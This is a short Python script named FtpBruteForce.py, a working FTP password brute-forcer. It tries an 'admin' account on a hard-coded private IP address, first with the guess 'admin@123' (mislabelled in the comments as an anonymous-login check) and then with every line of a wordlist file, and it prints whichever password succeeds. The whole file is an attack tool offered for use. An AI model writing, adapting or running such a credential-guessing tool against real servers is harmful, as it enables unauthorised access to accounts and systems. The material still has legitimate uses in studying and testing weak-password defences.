'''
Author: Paulo Neto 
File: FtpBruteForce.py

Description: 
Brute force simple and without use of thread.
'''
import ftplib
from colorama import Fore, init
import os 
import pyfiglet

# clear screen 
def cls():
    os.system('cls')

# init colorama
init()
GREEN = Fore.GREEN 
RESET = Fore.RESET 
GRAY  = Fore.LIGHTBLACK_EX
CYAN  = Fore.CYAN
RED   = Fore.RED

# main function which will handle the brute force process!!
def config(host, username, password):
    try:
        ftp = ftplib.FTP(host)
        ftp.login(username, password)
        ftp.quit()
        return True
    except:
        return False

def main():
    host = "192.168.0.10"
    username = "admin"
    passFile = "wordlist.txt"

    # check whether anonymous login enabled or not!
    if config(host, "admin", "admin@123"):
        print(f'{GREEN}[+]{RESET} Anonymous Login Successfull!')
        exit(0)
    else:
        print(F'{RED}[+] Anonymous Login Failed!{RESET}')
        # if the anonymous login failes let brute force now!
        print(f'{CYAN}[+] BruteForce Started [{host}]{RESET}')
        # lets open our password file and read the passwords from it and bruteforce
        passwordsfile = open(passFile, 'r')
        for password in passwordsfile.readlines():
            password = password.strip('\r').strip('\n')
            if config(host, username, password):
                print(f'[+] Brute Force Successfull [username:  {username} Password: {str(password)}]')
                exit(0)
            else:
                print(f'{RED}[-] Brute Force Failed{RESET}  [username:  {username}  Password:  {RED}{str(password)}{RESET}]')

if __name__ == "__main__":
    cls()
    ascii_banner = pyfiglet.figlet_format('FTP Brute Force')
    print(f'{Fore.CYAN}{ascii_banner}{Fore.RESET}')
    main()
    print('\n')
